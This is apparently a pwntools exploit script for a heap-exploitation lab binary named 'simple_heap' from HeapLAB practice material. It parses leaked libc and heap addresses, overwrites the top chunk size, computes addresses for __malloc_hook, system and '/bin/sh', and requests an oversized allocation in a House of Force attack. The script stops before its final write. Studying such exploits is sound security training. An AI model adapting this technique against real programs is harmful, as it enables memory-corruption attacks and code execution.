def malloc(size, data):
	p.sendline(b'1')
	p.sendlineafter(b'Enter size: \n', str(size))
	p.sendlineafter(b'data: \n', data)

def edit(ind, size, data):
	p.sendline(b'2')
	p.sendlineafter(b'Enter index: \n', str(ind))
	p.sendlineafter(b'Enter size: \n', str(size))
	p.sendlineafter(b'data: \n', data)

def delta(x, y):
    return (0xffffffffffffffff - x) + y
    
from pwn import *

#p = process(['./simple_heap', '/home/shravya/bi0s/pwn/malloc-labs/HeapLAB/.glibc/glibc_2.31_no-tcache/ld-2.31.so'], env={"LD_PRELOAD":"/home/shravya/bi0s/pwn/malloc-labs/HeapLAB/.glibc/glibc_2.31_no-tcache/libc-2.31.so"})

p = process('./simple_heap')
gdb.attach(p)

p.recvuntil('! ')
libc = int(p.recvline()[:-1], 16)

info('libc: %s'%hex(libc))

p.recvuntil("Here's one more generous leak for you: ")
heap = int(p.recvline()[:-1], 16)
 
info('heap: %s'%hex(heap))


# malloc
malloc(24, b'a'*20)

edit(0, 40, b'b'*24 + p64(0xffffffffffffffff))

libc_base = libc - 0x84420
malloc_hook = libc_base + 0x1ecb70
system = libc_base + 0x52290
binsh = libc_base + 0x1b45bd

target = 0x404068

dist = heap - target - 0x410
info('dist: %s'%hex(dist))
malloc(dist, b'c')


p.interactive()
